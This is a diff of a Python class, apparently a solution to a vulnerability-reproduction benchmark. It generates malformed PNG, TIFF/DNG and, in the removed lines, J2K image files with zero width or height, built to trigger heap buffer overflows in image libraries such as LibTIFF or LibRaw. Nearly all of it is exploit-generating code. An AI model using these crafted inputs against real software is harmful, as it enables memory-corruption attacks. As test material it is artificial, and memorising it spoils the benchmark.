@@ -1,148 +1,126 @@
 import tarfile
 import struct
-import os
+import zlib
+import io
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
         
-        The problem describes a Heap Buffer Overflow caused by "zero width or height images".
-        This is a common vulnerability pattern in image processing libraries like LibTIFF and OpenJPEG.
-        The solution attempts to identify the target library from the source path and generates
-        a malformed image file (TIFF or J2K) with zero dimensions but large data payloads
-        to trigger the overflow.
+        The vulnerability is described as "zero width or height images are not checked".
+        This typically affects image processing libraries like LibRaw, LibTIFF, or LibPNG.
+        We attempt to detect the library from the source tarball and generate a format-compliant
+        image with 0 dimensions.
         """
-        is_tiff = False
-        is_openjpeg = False
-        is_jasper = False
-
-        # Attempt to identify the library from tarball contents
+        is_libraw = False
+        is_libtiff = False
+        is_libpng = False
+        
         try:
-            with tarfile.open(src_path, 'r:*') as tar:
-                for name in tar.getnames():
-                    lower_name = name.lower()
-                    if 'tiff' in lower_name and 'libtiff' in lower_name:
-                        is_tiff = True
+            # Attempt to identify the library by peeking at filenames in the tarball
+            with tarfile.open(src_path, 'r') as tar:
+                # Check first 200 members to identify project
+                count = 0
+                for m in tar:
+                    name = m.name.lower()
+                    if "libraw" in name or "dcraw" in name:
+                        is_libraw = True
                         break
-                    if 'openjpeg' in lower_name:
-                        is_openjpeg = True
+                    if "tiff" in name and ("libtiff" in name or "tif_" in name):
+                        is_libtiff = True
                         break
-                    if 'jasper' in lower_name:
-                        is_jasper = True
+                    if "png" in name and ("libpng" in name or "png_" in name):
+                        is_libpng = True
+                        break
+                    count += 1
+                    if count > 200:
                         break
         except Exception:
-            pass
+            # Fallback assumption if tar processing fails
+            # LibRaw is a frequent target for this specific type of heap overflow description
+            is_libraw = True
 
-        # Fallback based on filename if tar inspection failed or was inconclusive
-        if not (is_tiff or is_openjpeg or is_jasper):
-            lower_path = src_path.lower()
-            if 'tiff' in lower_path:
-                is_tiff = True
-            elif 'openjpeg' in lower_path:
-                is_openjpeg = True
-            elif 'jasper' in lower_path:
-                is_jasper = True
-            else:
-                # Default to TIFF as it's a very common target for this specific bug pattern
-                is_tiff = True
+        if is_libpng:
+            return self._gen_png()
+        elif is_libtiff:
+            # Generate a standard Grayscale TIFF with 0x0 dimensions
+            return self._gen_tiff_base(0, 0, 1, 1, 8, is_dng=False)
+        else:
+            # Default to LibRaw: Generate a DNG (TIFF-based) with CFA configuration and 0x0 dimensions
+            # DNG/CFA path is often where complex logic resides
+            return self._gen_tiff_base(0, 0, 1, 32803, 12, is_dng=True)
 
-        if is_tiff:
-            return self.generate_tiff_poc()
-        elif is_openjpeg or is_jasper:
-            return self.generate_j2k_poc()
+    def _gen_png(self) -> bytes:
+        # PNG Signature
+        out = b'\x89PNG\r\n\x1a\n'
         
-        return self.generate_tiff_poc()
+        # IHDR chunk: Width=0, Height=0
+        # Depth=8, Color=2 (Truecolor), Comp=0, Filter=0, Interlace=0
+        ihdr_payload = struct.pack('>IIBBBBB', 0, 0, 8, 2, 0, 0, 0)
+        crc = zlib.crc32(b'IHDR' + ihdr_payload) & 0xffffffff
+        
+        out += struct.pack('>I', len(ihdr_payload))
+        out += b'IHDR'
+        out += ihdr_payload
+        out += struct.pack('>I', crc)
+        
+        # IEND chunk
+        iend_payload = b''
+        crc_end = zlib.crc32(b'IEND' + iend_payload) & 0xffffffff
+        out += struct.pack('>I', 0)
+        out += b'IEND'
+        out += struct.pack('>I', crc_end)
+        
+        return out
 
-    def generate_tiff_poc(self) -> bytes:
-        # Generates a TIFF file with ImageWidth=0 to trigger Heap Buffer Overflow.
-        # Logic: buffer allocation size = Width * RowsPerStrip * ... = 0.
-        # But read operation uses StripByteCounts = 2000.
-        # This causes a heap overflow write.
+    def _gen_tiff_base(self, w, h, spp, photo, bps, is_dng) -> bytes:
+        # Construct a Little Endian TIFF
+        header = b'II\x2a\x00\x08\x00\x00\x00'
         
-        # Header: Little Endian (II), Version 42, Offset to IFD (8)
-        header = struct.pack('<II', 0x002A4949, 8)
-        
-        # IFD Entries (Must be sorted by Tag ID)
         entries = []
-        fmt = '<HHII' # Tag, Type, Count, Value/Offset
+        # Helper to add IFD entry: Tag, Type, Count, Value
+        # Type 1=BYTE, 3=SHORT, 4=LONG
+        add = lambda t, ty, c, v: entries.append((t, ty, c, v))
         
-        # 256: ImageWidth = 0 (VULNERABILITY TRIGGER)
-        entries.append(struct.pack(fmt, 256, 3, 1, 0))
+        # Tags must be sorted by ID for valid TIFF
+        add(256, 4, 1, w)       # ImageWidth
+        add(257, 4, 1, h)       # ImageLength
+        add(258, 3, 1, bps)     # BitsPerSample
+        add(259, 3, 1, 1)       # Compression (1=None)
+        add(262, 3, 1, photo)   # PhotometricInterpretation
         
-        # 257: ImageLength = 10
-        entries.append(struct.pack(fmt, 257, 3, 1, 10))
+        # StripOffsets (Tag 273) placeholder, will update later
+        add(273, 4, 1, 0)       
         
-        # 258: BitsPerSample = 8
-        entries.append(struct.pack(fmt, 258, 3, 1, 8))
+        add(277, 3, 1, spp)     # SamplesPerPixel
+        add(278, 4, 1, 1)       # RowsPerStrip
+        add(279, 4, 1, 1)       # StripByteCounts
         
-        # 259: Compression = 1 (None)
-        entries.append(struct.pack(fmt, 259, 3, 1, 1))
+        if is_dng:
+            # DNGVersion (50706): Type BYTE(1), Count 4. Value 1.4.0.0
+            # Packed into 4-byte value field as 0x01, 0x04, 0x00, 0x00 -> 0x00000401 (Little Endian)
+            add(50706, 1, 4, 0x00000401)
+            
+        # Calculate data offset
+        # Header (8) + Count (2) + Entries (12 * N) + NextIFD (4)
+        ifd_size = 2 + len(entries) * 12 + 4
+        data_offset = 8 + ifd_size
         
-        # 262: PhotometricInterpretation = 1 (BlackIsZero)
-        entries.append(struct.pack(fmt, 262, 3, 1, 1))
+        # Update StripOffsets to point after IFD
+        for i in range(len(entries)):
+            if entries[i][0] == 273:
+                entries[i] = (273, 4, 1, data_offset)
+                break
         
-        # Calculate offset for StripOffsets
-        # Header(8) + Count(2) + 9 entries * 12 + Next(4) = 122
-        data_offset = 122
+        # Serialize IFD
+        out = header
+        out += struct.pack('<H', len(entries))
+        for t, ty, c, v in entries:
+            out += struct.pack('<HHII', t, ty, c, v)
+        out += b'\x00\x00\x00\x00' # Next IFD offset (0)
         
-        # 273: StripOffsets -> Points to data immediately after IFD
-        entries.append(struct.pack(fmt, 273, 4, 1, data_offset))
+        # Payload (minimal data)
+        out += b'\x00' * 16 
         
-        # 277: SamplesPerPixel = 1
-        entries.append(struct.pack(fmt, 277, 3, 1, 1))
-        
-        # 278: RowsPerStrip = 10
-        entries.append(struct.pack(fmt, 278, 3, 1, 10))
-        
-        # 279: StripByteCounts = 2000 (Size of read)
-        entries.append(struct.pack(fmt, 279, 4, 1, 2000))
-        
-        # Construct IFD: Count + Entries + NextPtr(0)
-        num_entries = len(entries)
-        ifd = struct.pack('<H', num_entries) + b''.join(entries) + struct.pack('<I', 0)
-        
-        # Payload (Garbage data to be read into the overflowing buffer)
-        payload = b'A' * 2000
-        
-        return header + ifd + payload
-
-    def generate_j2k_poc(self) -> bytes:
-        # Generates a J2K codestream with Xsiz (Width) = 0 to trigger Heap Buffer Overflow.
-        
-        # SOC (Start of Codestream)
-        soc = b'\xFF\x4F'
-        
-        # SIZ Marker (Image and tile size)
-        # Length: 38 (fixed fields) + 3 (1 component) + 2 (len field itself) = 43
-        lsiz = 43
-        
-        siz = b'\xFF\x51' + struct.pack('>H', lsiz)
-        siz += struct.pack('>H', 0)      # Rsiz (Capabilities)
-        siz += struct.pack('>I', 0)      # Xsiz (Width) = 0 (VULNERABILITY TRIGGER)
-        siz += struct.pack('>I', 128)    # Ysiz (Height)
-        siz += struct.pack('>I', 0)      # XOsiz (Grid offset X)
-        siz += struct.pack('>I', 0)      # YOsiz (Grid offset Y)
-        siz += struct.pack('>I', 128)    # XTsiz (Tile Width)
-        siz += struct.pack('>I', 128)    # YTsiz (Tile Height)
-        siz += struct.pack('>I', 0)      # XTOsiz
-        siz += struct.pack('>I', 0)      # YTOsiz
-        siz += struct.pack('>H', 1)      # Csiz (1 component)
-        siz += b'\x07\x01\x01'           # Component 0: 8-bit, 1x1 subsampling
-        
-        # COD Marker (Coding style default)
-        # Length: 12 bytes
-        cod = b'\xFF\x52' + struct.pack('>H', 12)
-        cod += b'\x00'                   # Scod
-        cod += b'\x00\x00\x01\x00'       # SGcod
-        cod += b'\x00\x00\x00\x00\x00'   # SPcod
-        
-        # QCD Marker (Quantization default)
-        # Minimal valid QCD
-        qcd = b'\xFF\x5C' + struct.pack('>H', 4) # Len = 4
-        qcd += b'\x00'                   # Sqcd (No quantization)
-        
-        # EOC (End of Codestream)
-        eoc = b'\xFF\xD9'
-        
-        return soc + siz + cod + qcd + eoc
+        return out
